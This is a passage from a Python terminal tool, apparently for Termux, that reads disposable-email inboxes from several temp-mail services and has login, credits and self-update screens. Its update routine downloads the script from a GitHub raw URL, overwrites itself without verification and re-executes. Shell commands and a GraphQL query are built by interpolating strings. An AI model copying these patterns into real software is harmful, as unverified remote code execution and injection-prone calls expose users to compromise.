            subject = msg.get('subject', msg.get('mail_subject', 'No Subject'))
            date = msg.get('date', msg.get('mail_date', 'N/A'))
            msg_id = msg.get('id', msg.get('mail_id', str(i+1)))
            print(f"  {G}[{msg_id}]{RES} From: {sender}")
            print(f"  {DIM}    Subject: {subject[:60]}{RES}")
            print(f"  {DIM}    Date: {date}{RES}\n")
    else:
        print(f"\n  {DIM}Inbox is empty. Send a test email to:{RES}")
        print(f"  {C}{current_temp_email}{RES}")

    input(f"\n  {DIM}Press ENTER to continue...{RES}")


def refresh_inbox():
    view_live_inbox()


def view_specific_email():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active temp email.{RES}")
        time.sleep(1.5); return

    service = temp_mail_session.get('service', current_temp_service)
    msg_id = input(f"  {W}Email ID to view: {RES}").strip()
    if not msg_id: return

    os.system('clear'); banner()
    spinner("Fetching email", 1)

    body = ""; subject = "No Subject"; sender = "Unknown"

    if service == "1secmail":
        login = temp_mail_session.get('login', '')
        domain = temp_mail_session.get('domain', '')
        if not login:
            parts = current_temp_email.split('@')
            login, domain = parts[0], parts[1]
        try:
            r = requests.get(
                f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                body = data.get('textBody', data.get('htmlBody', 'No content'))
                subject = data.get('subject', 'No Subject')
                sender = data.get('from', 'Unknown')
        except Exception as e:
            print(f"  {R}Error: {e}{RES}")

    elif service == "guerrillamail":
        sid = temp_mail_session.get('sid_token', '')
        try:
            r = requests.get(
                f"https://api.guerrillamail.com/ajax.php?f=fetch_email&sid_token={sid}&email_id={msg_id}",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                body = data.get('mail_body', data.get('mail_excerpt', 'No content'))
                subject = data.get('mail_subject', 'No Subject')
                sender = data.get('mail_from', 'Unknown')
        except Exception as e:
            print(f"  {R}Error: {e}{RES}")

    elif service == "mailtm":
        email = temp_mail_session.get('email', '')
        password = temp_mail_session.get('password', '')
        token = temp_mail_session.get('token', '')
        if not token:
            try:
                token_r = requests.post("https://api.mail.tm/token", json={
                    "address": email, "password": password
                }, timeout=10)
                if token_r.status_code == 200:
                    token = token_r.json().get('token', '')
                    temp_mail_session['token'] = token
            except: pass
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                body = data.get('text', data.get('html', [''])[0] if isinstance(data.get('html'), list) else '')
                subject = data.get('subject', 'No Subject')
                sender = data.get('from', {}).get('address', 'Unknown')
        except Exception as e:
            print(f"  {R}Error: {e}{RES}")

    elif service == "maildrop":
        login = temp_mail_session.get('login', '')
        try:
            r = requests.post("https://api.maildrop.cc/graphql", json={
                "query": f'{{ message(mailbox: "{login}", id: "{msg_id}") {{ id headerFrom subject text html date }} }}'
            }, timeout=10)
            if r.status_code == 200:
                data = r.json()
                msg = data.get('data', {}).get('message', {})
                if msg:
                    body = msg.get('text', msg.get('html', 'No content'))
                    subject = msg.get('subject', 'No Subject')
                    sender = msg.get('headerFrom', 'Unknown')
        except Exception as e:
            print(f"  {R}Error: {e}{RES}")

    print(f"\n  {G}Subject: {subject}{RES}")
    print(f"  {G}From: {sender}{RES}")
    print(f"  {G}{'─'*50}{RES}")
    print(f"  {W}{str(body)[:2000]}{RES}")
    print(f"  {G}{'─'*50}{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")


def copy_tempmail():
    global current_temp_email
    if not current_temp_email:
        print(f"  {R}No active temp email.{RES}")
        time.sleep(1.5); return
    os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
    print(f"  {G}[OK] Email copied: {C}{current_temp_email}{RES}")
    time.sleep(1.5)


def change_tempmail_service():
    global current_temp_email, current_temp_service, temp_mail_session
    current_temp_email = None
    current_temp_service = None
    temp_mail_session = {"email": "", "password": "", "token": "", "service": "", "login": "", "domain": "", "sid_token": ""}
    print(f"  {G}[OK] Service reset. Generate a new email.{RES}")
    time.sleep(1)
    
# ── CREDITS ─────────────────────────────
def credits():
    os.system('clear')
    w = tw()
    print("\n" * 3)
    print(f"{C}{BOLD}CREDITS{RES}".center(w + 8))
    print(f"{W}This tool was developed with dedication and passion{RES}".center(w + 50))
    print(f"{W}Thank you for using this tool.{RES}".center(w + 30))
    print(f"{G}{BOLD}CREATED BY{RES}".center(w + 10))
    print(f"{Y}{BOLD}SAEKA TOJIRP{RES}".center(w + 14))
    print(f"{C}Contact: {CREATOR_FB}{RES}".center(w + len(CREATOR_FB) + 9))
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

# ── UPDATE TOOL ────────────────────────────
VERSION = "1.0"  # Current version
REPO_RAW_URL = "https://raw.githubusercontent.com/saekacutie/sakea/main/main.py"

def update_tool():
    """Download the latest Version from the Source and restart the tool."""
    os.system('clear')
    banner()
    print(f"  {Y}UPDATE TOOL{RES}\n")
    print(f"  Current version: {VERSION}")
    print(f"  Checking for updates...")

    spinner("Fetching latest version", 1.5)

    try:
        # Download the latest main.py
        r = requests.get(REPO_RAW_URL, timeout=15)
        if r.status_code == 200:
            latest_code = r.text
            # Check if different (simple check: compare file size or a version string)
            current_file = os.path.abspath(__file__)
            with open(current_file, 'r') as f:
                current_code = f.read()

            if latest_code == current_code:
                print(f"  {G}[OK] Already up-to-date.{RES}")
                time.sleep(1.5)
                return

            # Backup current file
            backup_file = current_file + ".bak"
            shutil.copy(current_file, backup_file)

            # Write new code
            with open(current_file, 'w') as f:
                f.write(latest_code)

            print(f"  {G}[OK] Update downloaded. Restarting...{RES}")
            time.sleep(1)

            # Restart the tool
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"  {R}Failed to fetch update (HTTP {r.status_code}).{RES}")
            time.sleep(2)
    except Exception as e:
        print(f"  {R}Update error: {e}{RES}")
        time.sleep(2)
        
# ── END SESSION ─────────────────────────
def end_session():
    colors = [R, G, B, M, C, Y]; frames = ['◜', '◠', '◝', '◞', '◡', '◟']
    end = time.time() + 3; i = 0; c = 0
    while time.time() < end:
        os.system('clear')
        h = shutil.get_terminal_size().lines
        print("\n" * (h // 2 - 3))
        color = colors[c % len(colors)]
        print(f"{color}{BOLD}THANK YOU FOR USING SAEKAX TOOL{RES}".center(tw() + 30))
        print(f"{color}{frames[i%6]}{RES}".center(tw()))
        print(f"{color}TERMINATING SESSION...{RES}".center(tw() + 20))
        time.sleep(0.15); i += 1
        if i % 6 == 0: c += 1
    os.system('clear'); sys.exit(0)

# ── AUTH SCREEN ──────────────────────────
def auth_screen():
    options = ["SIGNUP", "LOGIN"]
    selected = 0
    while True:
        os.system('clear')
        h = shutil.get_terminal_size().lines
        w = tw()
        print("\n" * (h // 2 - 5))
        print(f"{BOLD}{C}HOLA! HEY THERE{RES}".center(w + 30))
        for i, option in enumerate(options):
            if i == selected:
                print(f"{G}{BOLD}▸ {option}{RES}".center(w + 4))
            else:
                print(f"{DIM}  {option}{RES}".center(w + 4))
        colors = [R, G, B, M, C, Y]
        footer = "Created by Saeka Tojirp"
        for i, char in enumerate(footer):
            sys.stdout.write(f"{colors[i % len(colors)]}{BOLD}{char}{RES}")
        sys.stdout.write("\n"); sys.stdout.flush()
        key = get_key()
        if key == 'UP' and selected > 0: selected -= 1
        elif key == 'DOWN' and selected < 1: selected += 1
        elif key == 'ENTER':
            if selected == 0: signup()
            else: login()
            break

# ── MAIN ───────────────────────────────────
def main():
    init_db()
    loading_screen()
    auth_screen()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: os.system('clear'); sys.exit(0)
